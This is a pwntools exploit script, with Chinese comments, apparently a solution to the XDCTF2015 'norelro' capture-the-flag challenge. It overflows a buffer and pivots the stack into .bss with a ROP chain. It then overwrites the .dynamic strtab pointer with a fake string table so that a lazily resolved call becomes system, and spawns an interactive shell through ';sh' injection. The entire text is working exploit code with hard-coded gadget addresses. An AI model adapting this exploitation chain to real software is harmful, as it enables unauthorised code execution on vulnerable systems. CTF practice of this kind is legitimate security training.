from pwn import *
context.log_level = 'debug'
elf = ELF('./norelro')

offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048629 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804862b
leave_ret = 0x08048445 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x300
bss_addr = 0x080498e0 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

r = process('./norelro')
#r = gdb.debug("./bof3","break main")
r.recvuntil('Welcome to XDCTF2015~!\n')
# 将栈迁移到bss段
payload = flat('A' * offset
, p32(read_plt)
, p32(ppp_ret)
, p32(0)
, p32(base_stage)
, p32(0x500)
, p32(pop_ebp_ret)
, p32(base_stage)
, p32(leave_ret))
r.sendline(payload)

# 由于多函数调用在一个payload里会参数混乱，此时system的参数为p32(strtab)，所以采取shell注入的方式
fake_dynstr = '\x00libc.so.6\x00_IO_stdin_used\x00stdin\x00strlen\x00read\x00stdout\x00setbuf\x00__libc_start_main\x00system\x00' 
strtab = 0x08049808 # .dynamic节中strtab的地址
payload2 = flat('AAAA'
, p32(read_plt)
, p32(0x080483A6) # push 20h;jmp plt[0]
, p32(0)
, p32(strtab) # .dynamic中strtab的地址
, p32(7)
, fake_dynstr)

r.sendline(payload2)
# 这里实际上是 system(p32(base_stage+24)+';sh') 而由于system(p32(base_stage+24))会调用失败，显示找不到这个命令，然后就会被';'结束掉这个命令，开启下一个命令，也就是system('sh')
fake_str_addr = flat(p32(base_stage + 24),';sh') # 覆盖strtab地址，并shell注入
payload3 = flat(fake_str_addr )
r.send(payload3)
r.interactive()